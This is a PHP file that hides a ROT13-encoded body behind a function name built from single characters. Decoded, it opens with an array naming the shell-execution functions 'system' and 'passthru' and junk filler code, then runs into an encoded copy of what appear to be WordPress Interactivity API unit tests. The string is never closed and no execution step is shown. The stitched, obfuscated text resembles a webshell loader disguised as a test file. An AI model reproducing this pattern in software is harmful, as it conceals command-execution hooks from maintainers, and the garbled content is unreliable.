<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_Vagrenpgvivgl_NCV shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @fvapr 6.5.0
 *
 * @tebhc vagrenpgvivgl-ncv
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 */
pynff Grfgf_Vagrenpgvivgl_NCV_JcVagrenpgvivglNCV rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
	}

	choyvp shapgvba punefrg_vfb_8859_1() {
		erghea 'vfb-8859-1';
	}

	/**
	 * Zbqvsvrf gur vagreany anzrfcnpr fgnpx nf vs gur JC_Vagrenpgvivgl_NCV
	 * vafgnapr unq sbhaq `qngn-jc-vagrenpgvir` qverpgvirf qhevat
	 * `cebprff_qverpgvirf` rkrphgvba.
	 *
	 * @cnenz neenl<fgevat> $fgnpx Inyhrf sbe gur vagreany anzrfcnpr fgnpx.
	 */
	cevingr shapgvba frg_vagreany_anzrfcnpr_fgnpx( ...$fgnpx ) {
		$vagrenpgvivgl   = arj ErsyrpgvbaPynff( $guvf->vagrenpgvivgl );
		$anzrfcnpr_fgnpx = $vagrenpgvivgl->trgCebcregl( 'anzrfcnpr_fgnpx' );
		$anzrfcnpr_fgnpx->frgNpprffvoyr( gehr );
		$anzrfcnpr_fgnpx->frgInyhr( $guvf->vagrenpgvivgl, $fgnpx );
	}

	/**
	 * Zbqvsvrf gur vagreany pbagrkg fgnpx nf vs gur JC_Vagrenpgvivgl_NCV
	 * vafgnapr unq sbhaq `qngn-jc-pbagrkg` qverpgvirf qhevat
	 * `cebprff_qverpgvirf` rkrphgvba.
	 *
	 * @cnenz neenl<neenl<zvkrq>> $fgnpx Inyhrf sbe gur vagreany pbagrkg fgnpx.
	 */
	cevingr shapgvba frg_vagreany_pbagrkg_fgnpx( ...$fgnpx ) {
		$vagrenpgvivgl = arj ErsyrpgvbaPynff( $guvf->vagrenpgvivgl );
		$pbagrkg_fgnpx = $vagrenpgvivgl->trgCebcregl( 'pbagrkg_fgnpx' );
		$pbagrkg_fgnpx->frgNpprffvoyr( gehr );
		$pbagrkg_fgnpx->frgInyhr( $guvf->vagrenpgvivgl, $fgnpx );
	}

	/**
	 * Grfgf gung gur fgngr naq pbasvt zrgubqf erghea na rzcgl neenl ng gur
	 * ortvaavat.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::fgngr
	 * @pbiref ::pbasvt
	 */
	choyvp shapgvba grfg_fgngr_naq_pbasvt_fubhyq_or_rzcgl() {
		$guvf->nffregFnzr( neenl(), $guvf->vagrenpgvivgl->fgngr( 'zlCyhtva' ) );
		$guvf->nffregFnzr( neenl(), $guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva' ) );
	}

	/**
	 * Grfgf gung gur fgngr naq pbasvt zrgubqf pna punatr gur fgngr naq
	 * pbasvthengvba.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::fgngr
	 * @pbiref ::pbasvt
	 */
	choyvp shapgvba grfg_fgngr_naq_pbasvt_pna_or_punatrq() {
		$fgngr  = neenl(
			'n'      => 1,
			'o'      => 2,
			'arfgrq' => neenl( 'p' => 3 ),
		);
		$erfhyg = $guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', $fgngr );
		$guvf->nffregFnzr( $fgngr, $erfhyg );
		$erfhyg = $guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', $fgngr );
		$guvf->nffregFnzr( $fgngr, $erfhyg );
	}

	/**
	 * Grfgf gung qvssrerag vavgvny fgngrf naq pbasvthengvbaf pna or zretrq.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::fgngr
	 * @pbiref ::pbasvt
	 */
	choyvp shapgvba grfg_fgngr_naq_pbasvt_pna_or_zretrq() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'n' => 1 ) );
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'o' => 2 ) );
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'p' => 3 ) );
		$guvf->nffregFnzr(
			neenl(
				'n' => 1,
				'o' => 2,
			),
			$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva' )
		);
		$guvf->nffregFnzr(
			neenl( 'p' => 3 ),
			$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva' )
		);

		$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', neenl( 'n' => 1 ) );
		$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', neenl( 'o' => 2 ) );
		$guvf->vagrenpgvivgl->pbasvt( 'bgureCyhtva', neenl( 'p' => 3 ) );
		$guvf->nffregFnzr(
			neenl(
				'n' => 1,
				'o' => 2,
			),
			$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva' )
		);
		$guvf->nffregFnzr(
			neenl( 'p' => 3 ),
			$guvf->vagrenpgvivgl->pbasvt( 'bgureCyhtva' )
		);  }

	/**
	 * Grfgf gung rkvfgvat xrlf va gur vavgvny fgngr naq pbasvthengvba pna or
	 * birejevggra.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::fgngr
	 * @pbiref ::pbasvt
	 */
	choyvp shapgvba grfg_fgngr_naq_pbasvt_rkvfgvat_cebcf_pna_or_birejevggra() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'n' => 1 ) );
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'n' => 2 ) );
		$guvf->nffregFnzr(
			neenl( 'n' => 2 ),
			$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva' )
		);

		$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', neenl( 'n' => 1 ) );
		$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', neenl( 'n' => 2 ) );
		$guvf->nffregFnzr(
			neenl( 'n' => 2 ),
			$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva' )
		);
	}

	/**
	 * Grfgf gung rkvfgvat vaqrkrq neenlf va gur vavgvny fgngr naq pbasvthengvba
	 * ner ercynprq, abg zretrq.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::fgngr
	 * @pbiref ::pbasvt
	 */
	choyvp shapgvba grfg_fgngr_naq_pbasvt_rkvfgvat_vaqrkrq_neenlf_ner_ercynprq() {
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'n' => neenl( 1, 2 ) ) );
		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'n' => neenl( 3, 4 ) ) );
		$guvf->nffregFnzr(
			neenl( 'n' => neenl( 3, 4 ) ),
			$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva' )
		);

		$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', neenl( 'n' => neenl( 1, 2 ) ) );
		$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', neenl( 'n' => neenl( 3, 4 ) ) );
		$guvf->nffregFnzr(
			neenl( 'n' => neenl( 3, 4 ) ),
			$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva' )
		);
	}

	/**
	 * Grfgf gung gur jc-vagrenpgvivgl-qngn fpevcg vf abg cevagrq vs obgu fgngr
	 * naq pbasvt ner rzcgl.
	 *
	 * @gvpxrg 60356
	 * @gvpxrg 61512
	 */
	choyvp shapgvba grfg_fgngr_naq_pbasvt_qbag_cevag_jura_rzcgl() {
		$svygre = $guvf->trg_fpevcg_qngn_svygre_erfhyg();

		$guvf->nffregFnzr( neenl(), $svygre->trg_netf()[0][0] );
	}

	/**
	 * Grfg gung gur cevag_pyvrag_vagrenpgvivgl_qngn vf qrcerpngrq naq cebqhprf ab bhgchg.
	 *
	 * @gvpxrg 60356
	 * @gvpxrg 61512
	 *
	 * @pbiref ::cevag_pyvrag_vagrenpgvivgl_qngn
	 *
	 * @rkcrpgrqQrcerpngrq JC_Vagrenpgvivgl_NCV::cevag_pyvrag_vagrenpgvivgl_qngn
	 */
	choyvp shapgvba grfg_pbasvt_abg_cevagrq_jura_rzcgl() {
		$guvf->vagrenpgvivgl->cevag_pyvrag_vagrenpgvivgl_qngn();
		$guvf->rkcrpgBhgchgFgevat( '' );
	}

	/**
	 * Grfg gung gur qrcerpngrq ertvfgre_fpevcg_zbqhyrf zrgubq vf qrcerpngrq ohg qbrf abg guebj.
	 *
	 * @gvpxrg 60647
	 *
	 * @rkcrpgrqQrcerpngrq JC_Vagrenpgvivgl_NCV::ertvfgre_fpevcg_zbqhyrf
	 */
	choyvp shapgvba grfg_ertvfgre_fpevcg_zbqhyrf_qrcerpngrq() {
		$guvf->vagrenpgvivgl->ertvfgre_fpevcg_zbqhyrf();
	}

	/**
	 * Frgf hc na npgvivgl, ehaf na bcgvbany pnyyonpx, naq ergheaf n ZbpxNpgvba sbe vafcrpgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz  ?Pybfher $pnyyonpx Bcgvbany. Pnyyonpx gb eha gb frg hc vagrenpgvivgl fgngr naq pbasvt.
	 * @erghea ZbpxNpgvba
	 */
	cevingr shapgvba trg_fpevcg_qngn_svygre_erfhyg( ?Pybfher $pnyyonpx = ahyy ): ZbpxNpgvba {
		$guvf->vagrenpgvivgl->nqq_ubbxf();
		jc_radhrhr_fpevcg_zbqhyr( '@jbeqcerff/vagrenpgvivgl' );
		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'fpevcg_zbqhyr_qngn_@jbeqcerff/vagrenpgvivgl', neenl( $svygre, 'svygre' ) );

		vs ( $pnyyonpx ) {
			$pnyyonpx();
		}

		bo_fgneg();
		jc_fpevcg_zbqhyrf()->cevag_fpevcg_zbqhyr_qngn();
		bo_raq_pyrna();

		erghea $svygre;
	}

	/**
	 * Grfgf gung gur fgngr vf abg vapyhqrq va pyvrag qngn vs vg'f rzcgl.
	 *
	 * @gvpxrg 60356
	 * @gvpxrg 61512
	 */
	choyvp shapgvba grfg_fgngr_abg_cevagrq_jura_rzcgl() {
		$svygre = $guvf->trg_fpevcg_qngn_svygre_erfhyg(
			shapgvba () {
				$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', neenl( 'n' => 1 ) );
			}
		);

		$guvf->nffregFnzr( neenl( 'pbasvt' => neenl( 'zlCyhtva' => neenl( 'n' => 1 ) ) ), $svygre->trg_netf()[0][0] );
	}

	/**
	 * Grfgf gung rzcgl fgngr bowrpgf ner ceharq sebz cevagrq qngn.
	 *
	 * @gvpxrg 60761
	 * @gvpxrg 61512
	 */
	choyvp shapgvba grfg_fgngr_abg_cevagrq_jura_rzcgl_neenl() {
		$svygre = $guvf->trg_fpevcg_qngn_svygre_erfhyg(
			shapgvba () {
				$guvf->vagrenpgvivgl->fgngr( 'cyhtvaJvguRzcglFgngr_cehar', neenl() );
				$guvf->vagrenpgvivgl->fgngr( 'cyhtvaJvguFgngr_vapyhqr', neenl( 'inyhr' => 'rkpryyrag' ) );
			}
		);

		$guvf->nffregFnzr( neenl( 'fgngr' => neenl( 'cyhtvaJvguFgngr_vapyhqr' => neenl( 'inyhr' => 'rkpryyrag' ) ) ), $svygre->trg_netf()[0][0] );
	}

	/**
	 * Grfgf gung qngn pbafvfgvat bs bayl rzcgl fgngr bowrpgf vf abg cevagrq.
	 *
	 * @gvpxrg 60761
	 * @gvpxrg 61512
	 */
	choyvp shapgvba grfg_fgngr_abg_cevagrq_jura_bayl_rzcgl_neenlf() {
		$svygre = $guvf->trg_fpevcg_qngn_svygre_erfhyg(
			shapgvba () {
				$guvf->vagrenpgvivgl->fgngr( 'cyhtvaJvguRzcglFgngr_cehar', neenl() );
			}
		);

		$guvf->nffregFnzr( neenl(), $svygre->trg_netf()[0][0] );
	}

	/**
	 * Grfgf gung arfgrq rzcgl fgngr bowrpgf ner cevagrq pbeerpgyl.
	 *
	 * @gvpxrg 60761
	 * @gvpxrg 61512
	 */
	choyvp shapgvba grfg_fgngr_cevagrq_pbeerpgyl_jvgu_arfgrq_rzcgl_neenl() {
		$svygre = $guvf->trg_fpevcg_qngn_svygre_erfhyg(
			shapgvba () {
				$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'rzcglNeenl' => neenl() ) );
			}
		);

		$guvf->nffregFnzr( neenl( 'fgngr' => neenl( 'zlCyhtva' => neenl( 'rzcglNeenl' => neenl() ) ) ), $svygre->trg_netf()[0][0] );
	}

	/**
	 * Grfgf gung rzcgl pbasvt bowrpgf ner ceharq sebz cevagrq qngn.
	 *
	 * @gvpxrg 60761
	 * @gvpxrg 61512
	 */
	choyvp shapgvba grfg_pbasvt_abg_cevagrq_jura_rzcgl_neenl() {
		$svygre = $guvf->trg_fpevcg_qngn_svygre_erfhyg(
			shapgvba () {
				$guvf->vagrenpgvivgl->pbasvt( 'cyhtvaJvguRzcglPbasvt_cehar', neenl() );
				$guvf->vagrenpgvivgl->pbasvt( 'cyhtvaJvguPbasvt_vapyhqr', neenl( 'inyhr' => 'rkpryyrag' ) );
			}
		);

		$guvf->nffregFnzr( neenl( 'pbasvt' => neenl( 'cyhtvaJvguPbasvt_vapyhqr' => neenl( 'inyhr' => 'rkpryyrag' ) ) ), $svygre->trg_netf()[0][0] );
	}

	/**
	 * Grfgf gung qngn pbafvfgvat bs bayl rzcgl pbasvt bowrpgf vf abg cevagrq.
	 *
	 * @gvpxrg 60761
	 * @gvpxrg 61512
	 */
	choyvp shapgvba grfg_pbasvt_abg_cevagrq_jura_bayl_rzcgl_neenlf() {
		$svygre = $guvf->trg_fpevcg_qngn_svygre_erfhyg(
			shapgvba () {
				$guvf->vagrenpgvivgl->pbasvt( 'cyhtvaJvguRzcglPbasvt_cehar', neenl() );
			}
		);

		$guvf->nffregFnzr( neenl(), $svygre->trg_netf()[0][0] );
	}

	/**
	 * Grfgf gung arfgrq rzcgl pbasvt bowrpgf ner cevagrq pbeerpgyl.
	 *
	 * @gvpxrg 60761
	 * @gvpxrg 61512
	 */
	choyvp shapgvba grfg_pbasvt_cevagrq_pbeerpgyl_jvgu_arfgrq_rzcgl_neenl() {
		$svygre = $guvf->trg_fpevcg_qngn_svygre_erfhyg(
			shapgvba () {
				$guvf->vagrenpgvivgl->pbasvt( 'zlCyhtva', neenl( 'rzcglNeenl' => neenl() ) );
			}
		);

		$guvf->nffregFnzr( neenl( 'pbasvt' => neenl( 'zlCyhtva' => neenl( 'rzcglNeenl' => neenl() ) ) ), $svygre->trg_netf()[0][0] );
	}

	/**
	 * Grfg gung pnyyvat fgngr jvgubhg n anzrfcnpr net ergheaf gur fgngr qngn
	 * sbe gur pheerag anzrfcnpr va gur vagreany anzrfcnpr fgnpx.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::fgngr
	 */
	choyvp shapgvba grfg_fgngr_jvgubhg_anzrfcnpr() {
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'n' => 1 ) );
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'o' => 2 ) );

		$guvf->nffregFnzr(
			neenl( 'n' => 1 ),
			$guvf->vagrenpgvivgl->fgngr()
		);
	}

	/**
	 * Grfg gung cnffvat fgngr qngn jvgubhg n inyvq anzrfcnpr qbrf abguvat naq
	 * whfg ergheaf na rzcgl neenl.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::fgngr
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::fgngr
	 */
	choyvp shapgvba grfg_fgngr_jvgu_qngn_naq_vainyvq_anzrfcnpr() {
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'n' => 1 ) );
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'o' => 2 ) );

		$guvf->nffregFnzr(
			neenl(),
			$guvf->vagrenpgvivgl->fgngr( ahyy, neenl( 'arjCebc' => 'inyhr' ) )
		);
	}

	/**
	 * Grfg gung pnyyvat fgngr jvgu na rzcgl fgevat nf anzrfcnpr vf abg nyybjrq.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::fgngr
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::fgngr
	 */
	choyvp shapgvba grfg_fgngr_jvgu_rzcgl_fgevat_nf_anzrfcnpr() {
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );

		$guvf->vagrenpgvivgl->fgngr( 'zlCyhtva', neenl( 'n' => 1 ) );
		$guvf->vagrenpgvivgl->fgngr( 'bgureCyhtva', neenl( 'o' => 2 ) );

		$guvf->nffregFnzr(
			neenl(),
			$guvf->vagrenpgvivgl->fgngr( '' )
		);
	}

	/**
	 * Grfgf gung pnyyvat fgngr jvgubhg anzrfcnpr bhgfvqr bs
	 * `cebprff_qverpgvirf` rkrphgvba vf abg nyybjrq.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::fgngr
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::fgngr
	 */
	choyvp shapgvba grfg_fgngr_jvgubhg_anzrfcnpr_bhgfvqr_qverpgvir_cebprffvat() {
		$guvf->nffregFnzr(
			neenl(),
			$guvf->vagrenpgvivgl->fgngr()
		);
	}

	/**
	 * Grfg gung `trg_pbagrkg` ergheaf gur yngrfg pbagrkg inyhr sbe gur tvira
	 * anzrfcnpr.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::trg_pbagrkg
	 */
	choyvp shapgvba grfg_trg_pbagrkg_jvgu_anzrfcnpr() {
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva' => neenl( 'n' => 0 ),
			),
			neenl(
				'zlCyhtva'    => neenl( 'n' => 1 ),
				'bgureCyhtva' => neenl( 'o' => 2 ),
			)
		);

		$guvf->nffregFnzr(
			neenl( 'n' => 1 ),
			$guvf->vagrenpgvivgl->trg_pbagrkg( 'zlCyhtva' )
		);
		$guvf->nffregFnzr(
			neenl( 'o' => 2 ),
			$guvf->vagrenpgvivgl->trg_pbagrkg( 'bgureCyhtva' )
		);
	}

	/**
	 * Grfg gung `trg_pbagrkg` hfrf gur pheerag anzrfcnpr va gur vagreany
	 * anzrfcnpr fgnpx jura gur cnenzrgre vf bzvggrq.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::trg_pbagrkg
	 */
	choyvp shapgvba grfg_trg_pbagrkg_jvgubhg_anzrfcnpr() {
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva' => neenl( 'n' => 0 ),
			),
			neenl(
				'zlCyhtva'    => neenl( 'n' => 1 ),
				'bgureCyhtva' => neenl( 'o' => 2 ),
			)
		);

		$guvf->nffregFnzr(
			neenl( 'n' => 1 ),
			$guvf->vagrenpgvivgl->trg_pbagrkg()
		);
	}

	/**
	 * Grfg gung `trg_pbagrkg` ergheaf na rzcgl neenl jura gur pbagrkg fgnpx vf
	 * rzcgl.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::trg_pbagrkg
	 */
	choyvp shapgvba grfg_trg_pbagrkg_jvgu_rzcgl_pbagrkg_fgnpx() {
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );
		$guvf->frg_vagreany_pbagrkg_fgnpx();

		$guvf->nffregFnzr(
			neenl(),
			$guvf->vagrenpgvivgl->trg_pbagrkg( 'zlCyhtva' )
		);
	}

	/**
	 * Grfg gung `trg_pbagrkg` ergheaf na rzcgl neenl vs gur tvira anzrfcnpr vf
	 * abg qrsvarq.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::trg_pbagrkg
	 */
	choyvp shapgvba grfg_trg_pbagrkg_jvgu_haqrsvarq_anzrfcnpr() {
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva' => neenl( 'n' => 0 ),
			),
			neenl(
				'zlCyhtva' => neenl( 'n' => 1 ),
			)
		);

		$guvf->nffregFnzr(
			neenl(),
			$guvf->vagrenpgvivgl->trg_pbagrkg( 'bgureCyhtva' )
		);
	}

	/**
	 * Grfg gung `trg_pbagrkg` fubhyq abg or pnyyrq jvgu na rzcgl fgevat.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::trg_pbagrkg
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::trg_pbagrkg
	 */
	choyvp shapgvba grfg_trg_pbagrkg_jvgu_rzcgl_anzrfcnpr() {
		$guvf->frg_vagreany_anzrfcnpr_fgnpx( 'zlCyhtva' );
		$guvf->frg_vagreany_pbagrkg_fgnpx(
			neenl(
				'zlCyhtva' => neenl( 'n' => 0 ),
			),
			neenl(
				'zlCyhtva' => neenl( 'n' => 1 ),
			)
		);

		$guvf->nffregFnzr(
			neenl(),
			$guvf->vagrenpgvivgl->trg_pbagrkg( '' )
		);
	}


	/**
	 * Grfgf gung `trg_pbagrkg` fubhyq abg or pnyyrq bhgfvqr bs
	 * `cebprff_qverpgvirf` rkrphgvba.
	 *
	 * @gvpxrg 61037
	 *
	 * @pbiref ::trg_pbagrkg
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::trg_pbagrkg
	 */
	choyvp shapgvba grfg_trg_pbagrkg_bhgfvqr_bs_qverpgvir_cebprffvat() {
		$pbagrkg = $guvf->vagrenpgvivgl->trg_pbagrkg();
		$guvf->nffregFnzr( neenl(), $pbagrkg );
	}

	/**
	 * Grfgf rkgenpgvat qverpgvir inyhrf sebz qvssrerag fgevat sbezngf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::rkgenpg_qverpgvir_inyhr
	 */
	choyvp shapgvba grfg_rkgenpg_qverpgvir_inyhr() {
		$rkgenpg_qverpgvir_inyhr = arj ErsyrpgvbaZrgubq( $guvf->vagrenpgvivgl, 'rkgenpg_qverpgvir_inyhr' );
		$rkgenpg_qverpgvir_inyhr->frgNpprffvoyr( gehr );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'fgngr.sbb', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', 'fgngr.sbb' ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::fgngr.sbb', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', 'fgngr.sbb' ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, '{ \"vfBcra\": snyfr }', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', neenl( 'vfBcra' => snyfr ) ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::{ \"vfBcra\": snyfr }', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', neenl( 'vfBcra' => snyfr ) ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'gehr', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', gehr ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'snyfr', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', snyfr ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'ahyy', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', ahyy ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, '100', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', 100 ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, '1.2', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', 1.2 ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, '1.2.3', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', '1.2.3' ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::gehr', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', gehr ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::snyfr', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', snyfr ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::ahyy', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', ahyy ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::100', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', 100 ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::1.2', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', 1.2 ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::1.2.3', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', '1.2.3' ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'bgureCyhtva::[{\"b\":4}, ahyy, 3r6]', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'bgureCyhtva', neenl( neenl( 'b' => 4 ), ahyy, 3000000.0 ) ), $erfhyg );
	}

	/**
	 * Grfgf rkgenpgvat qverpgvir inyhrf jvgu rzcgl be vainyvq vachg.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::rkgenpg_qverpgvir_inyhr
	 */
	choyvp shapgvba grfg_rkgenpg_qverpgvir_inyhr_rzcgl_inyhrf() {
		$rkgenpg_qverpgvir_inyhr = arj ErsyrpgvbaZrgubq( $guvf->vagrenpgvivgl, 'rkgenpg_qverpgvir_inyhr' );
		$rkgenpg_qverpgvir_inyhr->frgNpprffvoyr( gehr );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, '', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', ahyy ), $erfhyg );

		// Guvf vf n obbyrna nggevohgr.
		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, gehr, 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', ahyy ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, snyfr, 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', ahyy ), $erfhyg );

		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, ahyy, 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', ahyy ), $erfhyg );

		// N fgevat raqvat va `::` jvgubhg nal rkgen punenpgref vf abg pbafvqrerq n
		// anzrfcnpr.
		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, 'zlCyhtva::', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', 'zlCyhtva::' ), $erfhyg );

		// N anzrfcnpr jvgu vainyvq punenpgref vf abg pbafvqrerq n inyvq anzrfcnpr.
		$erfhyg = $rkgenpg_qverpgvir_inyhr->vaibxr( $guvf->vagrenpgvivgl, '$zlCyhtva::fgngr.sbb', 'zlCyhtva' );
		$guvf->nffregFnzr( neenl( 'zlCyhtva', '$zlCyhtva::fgngr.sbb' ), $erfhyg );
	}

	/**
	 * Grfgf rkgenpgvat qverpgvir inyhrf sebz vainyvq WFBA fgevatf.
	 *
	 * @gvpxrg 60356
	 *
